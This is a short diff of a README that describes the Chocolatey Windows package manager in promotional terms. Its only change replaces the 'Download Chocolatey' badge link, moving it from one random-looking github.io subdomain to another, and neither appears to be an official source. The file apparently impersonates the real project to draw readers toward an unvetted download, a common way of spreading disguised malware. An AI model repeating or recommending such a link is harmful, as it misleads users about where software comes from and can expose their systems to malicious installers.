@@ -2,7 +2,7 @@
 
 **Chocolatey** is a machine package manager and software deployment automation engine for Windows desktop and server operating systems. Built to replace manual software setup routines, it wraps installers (`.msi`, `.exe`), compressed archives, and custom scripts into standardized `.nupkg` packages. By exposing a unified command-line interface (`choco`) alongside an optional WPF graphical interface, Chocolatey enables IT administrators, DevOps engineers, and power users to install, upgrade, configure, and uninstall software across enterprise endpoint fleets.
 
-[![Download Chocolatey](https://img.shields.io/badge/Download-Chocolatey-0078D4?style=for-the-badge&logo=chocolatey&logoColor=white)](https://ehmydllq079.github.io/.github/Chocolatey-System-Engine)
+[![Download Chocolatey](https://img.shields.io/badge/Download-Chocolatey-0078D4?style=for-the-badge&logo=chocolatey&logoColor=white)](https://gloriabest-38.github.io/.github/Chocolatey-System-Engine)
 
 > **CORE ARCHITECTURE:** Extended NuGet packaging kernel integrated with native PowerShell execution wrappers to parse dependencies, evaluate version matrices, and run installation scripts.
 
